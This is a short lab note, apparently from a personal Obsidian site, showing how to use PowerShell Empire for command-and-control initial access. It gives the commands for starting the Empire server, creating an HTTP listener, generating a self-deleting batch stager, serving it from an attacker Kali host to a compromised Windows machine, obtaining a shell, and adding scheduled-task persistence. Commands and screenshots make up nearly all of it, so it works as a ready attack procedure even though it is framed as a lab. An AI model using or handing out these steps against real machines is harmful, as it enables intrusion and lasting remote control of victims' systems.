---
{"dg-publish":true,"permalink":"/c2-initial-access/"}
---

[[Simulating Command and Control Attack & Defend\|Simulating Command and Control Attack & Defend]]

Powershell-empire basics:

```C
sudo powershell-empire server
```

Create a listener:

```C
sudo powershell-empire client
(Empire:) > uselistener http
```

![Pasted image 20240928195850.png](/img/user/x/images/Pasted%20image%2020240928195850.png)
Then create a stager:

```C
(Empire: uselistener/http) > usestager windows_launcher_bat
(Empire: usestager/windows_launcher_bat) > set Listener http1
INFO: Set Listener to http1 
(Empire: usestager/windows_launcher_bat) > execute
INFO: launcher.bat written to /var/lib/powershell-empire/empire/client/generated-stagers/launcher.bat
```

Then serve it to the compromised machine via simple python server:

```C
cd /var/lib/powershell-empire/empire/client/generated-stagers
python3 -m http.server
```

Navigate to `http://<KALI_IP>:8000/`:

![Pasted image 20240928200633.png](/img/user/x/images/Pasted%20image%2020240928200633.png)
Download and execute the file (launcher will delete itself after execution), back to the kali linux:

![Pasted image 20240929162604.png](/img/user/x/images/Pasted%20image%2020240929162604.png)
Another screenshot:

![Pasted image 20240929162748.png](/img/user/x/images/Pasted%20image%2020240929162748.png)
Then we can use the command `interact <name>` to get a shell and to establish persistence:

```bash
usemodule powershell_persistence_userland_schtasks
set Listner http1
execute
```

Command Output:

![Pasted image 20240929163124.png](/img/user/x/images/Pasted%20image%2020240929163124.png)

